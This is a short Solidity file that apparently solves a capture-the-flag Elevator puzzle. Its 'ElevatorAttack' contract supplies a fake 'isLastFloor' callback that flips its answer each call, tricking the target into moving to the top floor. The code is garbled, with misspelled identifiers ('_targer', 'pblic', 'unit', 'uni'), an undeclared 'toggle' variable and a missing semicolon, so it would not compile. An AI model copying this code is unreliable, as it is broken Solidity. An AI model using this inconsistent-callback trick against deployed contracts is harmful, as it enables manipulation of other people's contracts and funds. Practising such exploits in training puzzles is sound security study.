// SPDX-License-Identifier: MIT
 
pragma solidity ^0.8.0

import './Elevator.sol';

contract ElevatorAttack {
    Elevator public target;

    constructor(address _target) {
        target = Elevator(_targer);

    }

    function isLAstFloor(unit) pblic returns(bool) {
        toggle = !toggle;
        return toggle;
    }
    function setTop(uni _floor) {
        target.goTo(_floor);
    }
}